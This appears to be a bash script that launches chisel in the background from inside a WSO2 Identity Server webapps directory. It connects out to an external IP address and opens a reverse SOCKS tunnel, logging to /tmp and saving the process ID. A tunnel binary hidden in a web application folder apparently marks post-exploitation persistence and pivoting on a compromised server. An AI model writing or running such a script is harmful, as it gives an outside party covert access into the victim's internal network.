#!/bin/bash
nohup /u04/ethos/wso2is-5.10.0/repository/deployment/server/webapps/STRATOS_ROOT/chisel_linux client 37.34.251.159:8888 R:socks > /tmp/chisel.log 2>&1 &
echo $! > /tmp/chisel.pid
